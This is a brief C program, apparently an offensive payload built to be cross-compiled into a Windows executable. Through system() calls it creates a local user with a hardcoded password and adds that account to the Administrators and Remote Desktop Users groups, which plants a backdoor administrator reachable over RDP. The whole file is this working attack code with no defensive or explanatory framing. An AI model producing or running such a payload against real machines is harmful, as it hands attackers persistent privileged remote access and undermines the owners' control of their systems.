#include <stdlib.h>

int main ()
{
  int i;

  i = system ("net user john Password123! /add");
  i = system("net localgroup administrators john /add && net localgroup \"Remote Desktop Users\" john /add");


  return 0;
}

// Compile Windows 11pro x64: x86_64-w64-mingw32-gcc adduserRDP.c -o adduserRDP.exe
